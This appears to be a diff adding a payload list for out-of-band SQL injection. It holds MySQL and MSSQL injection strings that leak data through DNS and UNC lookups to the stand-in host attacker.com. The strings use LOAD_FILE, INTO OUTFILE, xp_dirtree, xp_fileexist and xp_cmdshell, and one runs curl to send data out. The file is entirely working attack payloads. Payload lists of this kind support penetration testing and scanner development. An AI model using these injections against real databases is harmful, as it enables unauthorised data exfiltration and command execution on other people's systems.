@@ -1,0 +1,15 @@
+# MySQL DNS Exfiltration
+' UNION SELECT LOAD_FILE(CONCAT('\\\\',@@hostname,'.attacker.com\\file'))--
+' UNION SELECT 1,2 INTO OUTFILE '\\\\attacker.com\\exfil.txt'--
+' UNION SELECT 1,2 WHERE LOAD_FILE('\\\\attacker.com\\test.txt')--
+' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\\\attacker.com\\leak')--
+' UNION SELECT IF(1=1,LOAD_FILE('\\\\attacker.com\\file'),NULL)--
+
+# MSSQL DNS Exfiltration
+'; EXEC xp_dirtree '\\\\attacker.com\\data'--
+'; EXEC xp_fileexist '\\\\attacker.com\\check'--
+'; exec master..xp_dirtree '\\\\attacker.com\\data'--
+'; exec master..xp_fileexist '\\\\attacker.com\\info'--
+'; exec master..xp_cmdshell 'ping attacker.com'--
+'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--
+'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--
